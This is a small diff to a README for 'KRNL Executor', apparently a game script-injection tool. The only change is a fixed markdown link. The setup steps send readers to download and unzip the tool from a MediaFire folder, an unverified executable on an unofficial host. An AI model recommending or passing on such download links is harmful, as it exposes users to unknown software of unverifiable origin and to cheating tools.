@@ -2,7 +2,7 @@
 
 ## 📦 Quick Setup  
 Getting started with **KRNL Executor** is simple:  
-1. [![Download KRNL Executor](https://www.mediafire.com/folder/uqsghkqpe2zxa/KRNL))  
+1. [Download KRNL Executor](https://www.mediafire.com/folder/uqsghkqpe2zxa/KRNL)  
 2. Unzip the downloaded file into any folder you prefer.  
 
 ## 🧩 What is KRNL Executor?  
